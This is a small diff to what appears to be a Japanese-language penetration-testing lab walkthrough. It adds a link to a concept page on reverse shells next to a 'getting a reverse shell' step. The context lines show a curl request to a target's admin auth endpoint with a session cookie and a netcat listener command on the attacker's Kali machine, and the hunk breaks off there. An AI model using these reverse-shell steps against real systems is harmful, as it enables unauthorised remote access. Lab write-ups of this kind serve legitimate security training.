@@ -79,6 +79,8 @@ curl http://[TARGET]/api/v1/admin/auth -H "Cookie: PHPSESSID=<セッション>"
 
 #### Step 3: リバースシェル取得
 
+> リバースシェルの仕組み・ポート選択・VPN環境でのIP確認 → `../../06_Concepts/Reverse_Shell.md`
+
 **攻撃側（Kali）でリスナーを起動：**
 ```bash
 nc -lvnp 4444
